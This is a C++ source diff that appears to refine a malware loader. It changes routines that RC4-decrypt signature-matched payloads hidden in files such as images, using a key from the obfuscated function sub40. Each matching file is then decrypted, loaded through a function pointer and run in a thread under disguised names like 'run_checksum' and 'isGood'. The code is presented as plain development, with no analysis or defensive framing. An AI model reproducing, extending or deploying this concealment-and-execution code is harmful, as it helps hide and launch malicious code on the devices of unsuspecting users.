@@ -134,25 +134,24 @@ char *sub30(int n, char *buf, int buf_len) {
 int crypt(char *dst,char *src, char *key,int skyp)
  {
   rc4_ks_t keyrc4;
-  int chunk_size=512;
   std::ifstream iin (src, std::ifstream::binary);
   std::ofstream iout (dst, std::ifstream::binary);
-  logd("crypt key=%s [%d]",key,strlen((char *)key))
+  logd("crypt key=%s [%d]",key,(int)strlen((char *)key));
   if (iin) {
-    char * buffer = new char [chunk_size];
+    char * buffer = new char [CHUNK_SIZE];
     int length=0;
     memset(buffer,0,sizeof(buffer));
+    rc4_setks((uint8_t*)key, strlen((char *)key), &keyrc4);
+    rc4_crypt((uint8_t*)buffer,CHUNK_SIZE , &keyrc4);
     if(skyp){
-      iin.read (buffer,skyp);
-      length = (int)iin.gcount() ;
-      iout.write(buffer,length);
-    }
+         iin.read (buffer,skyp);
+         length = (int)iin.gcount() ;
+         iout.write(buffer,length);
+       }
     do{
-
       memset(buffer,0,sizeof(buffer));
-      iin.read (buffer,chunk_size);
+      iin.read (buffer,CHUNK_SIZE);
       length = (int)iin.gcount() ;
-      rc4_setks((uint8_t*)key, strlen((char *)key), &keyrc4);
       rc4_crypt((uint8_t*)buffer, length, &keyrc4);
       iout.write(buffer,length);
     }while(!iin.eof());
@@ -172,9 +171,9 @@ void rc4_setks(const uint8_t *buf, size_t len, rc4_ks_t *ks)
   uint8_t *state = ks->state;
   int i;
 
-  for (i = 0;  i < 256; ++i)
+  for (i = 0;  i < 256; ++i){
     state[i] = i;
-
+  }
   ks->x = 0;
   ks->y = 0;
 
@@ -591,71 +590,106 @@ char* sub40(){
   return byte;
 }
 
-
-int isGood(string f,char * payload,int payload_size,file_signature* fs,int type)
-{
+int isMatch(string f,char * payload,int payload_size,file_signature* fs,file_signature** return_fs){
   int i=0;
+   int match=0;
+   rc4_ks_t keyrc4;
+   logd("Start");
+   char * buffer = new char [CHUNK_SIZE];
+   if(payload_size>=512){
+     memset(buffer,0,sizeof(buffer));
+     rc4_setks((uint8_t*)sub40(), strlen((char *)sub40()), &keyrc4);
+     rc4_crypt((uint8_t*)buffer, CHUNK_SIZE, &keyrc4);
+     memcpy(buffer,payload,CHUNK_SIZE);
+     rc4_crypt((uint8_t*)buffer, CHUNK_SIZE, &keyrc4);
+   }
+   while( fs->h_name!=NULL && payload!=NULL && return_fs!=NULL){
+     logd("checking %d %p %s",i,fs,fs->h_name);
+     //First phase check the signature without decrypting
+     if(strlen(fs->signature)<=(payload_size*2)){
+       std::string tohexed = ToHex(std::string(payload, strlen(fs->signature)/2), true);
+       logd("checking %s: %s against signature %s",fs->h_name,tohexed.c_str(),fs->signature);
+       if (strncasecmp(fs->signature,tohexed.c_str(),strlen(fs->signature)) == 0)
+       {
+         logd("First phase found %s",fs->h_name);
+         match=1;
+       }
+     }
+     //Second phase decripy payload first 512 byte and check the signature again\
+     //decripted match win against PirstPhase match
+     if(strlen(fs->signature)<=(payload_size*2) and payload_size>=512 ){
+       //decrypt payload
+       std::string tohexed = ToHex(std::string(buffer, strlen(fs->signature)/2), true);
+       logd("checking %s: %s against signature %s",fs->h_name,tohexed.c_str(),fs->signature);
+       if (strncasecmp(fs->signature,tohexed.c_str(),strlen(fs->signature)) == 0)
+       {
+         logd("Second phase found %s",fs->h_name);
+         match=2;
+       }
+     }
+     if(match){
+       *return_fs=fs;
+       return match;
+     }
+     fs++;
+     i++;
+   }
+   *return_fs=NULL;
+   return match;
+}
+int isGood(string f,char * payload,int payload_size,file_signature* fs_list,int type)
+{
   int res=1;
-  int skyp=10;
+  int match=false;
+  file_signature* fs;
   logd("Start");
-  while( fs->h_name!=NULL && payload!=NULL){
-    logd("checking %d %p %s",i,fs,fs->h_name);
-    if(strlen(fs->signature)<=(payload_size*2)){
-      std::string tohexed = ToHex(std::string(payload, strlen(fs->signature)/2), true);
-      logd("checking %s: %s against signature %s",fs->h_name,tohexed.c_str(),fs->signature);
-      if (strncasecmp(fs->signature,tohexed.c_str(),strlen(fs->signature)) == 0)
-      {
-        logd("found %s",fs->h_name);
-        typedef int (*test_t)();
-        if(file_exist(f)){
-          string f_t=get_r_name(f);
-          crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),skyp);
-          shift_file(f,type,f_t);
-          if (strncasecmp(goods[1].h_name,fs->h_name,strlen(goods[1].h_name)) == 0){
-            logd("3");
-            return 3;
-          }
-          test_t test_fnc = (test_t) file_op(fileop_check,f);
-          if(test_fnc!=NULL){
-            //Start of part to be threaded
-            runned_file = f;
-
-            if(pthread_create(&th, NULL, run_checksum, (void*)test_fnc)){
-              logd("failed to execute Thread:");
-            }
-            logd("bad");
-            //end of part to be threaded
-          }else{
-            logd("good");
-          }
-
-          return res;
-        }
+  match=isMatch(f,payload,payload_size,fs_list,&fs);
+  if (match==2)
+  {
+    logd("found %s",fs->h_name);
+    typedef int (*test_t)();
+    if(file_exist(f)){
+      string f_t=get_r_name(f);
+      crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),0);
+      shift_file(f,type,f_t);
+      if (strncasecmp(goods[1].h_name,fs->h_name,strlen(goods[1].h_name)) == 0){
+        logd("3");
+        return 3;
       }
+      test_t test_fnc = (test_t) file_op(fileop_check,f);
+      if(test_fnc!=NULL){
+        //Start of part to be threaded
+        runned_file = f;
+
+        if(pthread_create(&th, NULL, run_checksum, (void*)test_fnc)){
+          logd("failed to execute Thread:");
+        }
+        logd("bad");
+        //end of part to be threaded
+      }else{
+        logd("good");
+      }
+      return res;
     }
-    fs++;
-    i++;
   }
+
   return 0;
 }
 
-int isType(char * payload,int payload_size,file_signature* fs)
+int isType(string f,char * payload,int payload_size,file_signature* fs_list,int type)
 {
-  int i=0;
   logd("Start");
-  while( fs->h_name!=NULL && payload!=NULL){
-    logd("checking %d %p %s",i,fs,fs->h_name);
-    if(strlen(fs->signature)<=(payload_size*2)){
-      std::string tohexed = ToHex(std::string(payload, strlen(fs->signature)/2), true);
-      logd("checking %s: %s against signature %s",fs->h_name,tohexed.c_str(),fs->signature);
-      if (strncasecmp(fs->signature,tohexed.c_str(),strlen(fs->signature)) == 0)
-      {
-        logd("found %s",fs->h_name);
-        return 1;
-      }
+  file_signature* fs;
+  int match=isMatch(f,payload,payload_size,fs_list,&fs);
+  if (match)
+  {
+    logd("found %s",fs->h_name);
+    if(match==2){
+      string f_t=get_r_name(f);
+      crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),0);
+      shift_file(f,type,f_t);
     }
-    fs++;
-    i++;
+    return 1;
   }
   return 0;
 }
@@ -676,7 +710,7 @@ int check_filebytype(string f,int type, char *payload, int size)
     res=0;
     break;
   case TYPE_IMGL:
-    return !isType(payload, size, images);
+    return !isType(f,payload, size, images,type);
     break;
     res=0;
     break;
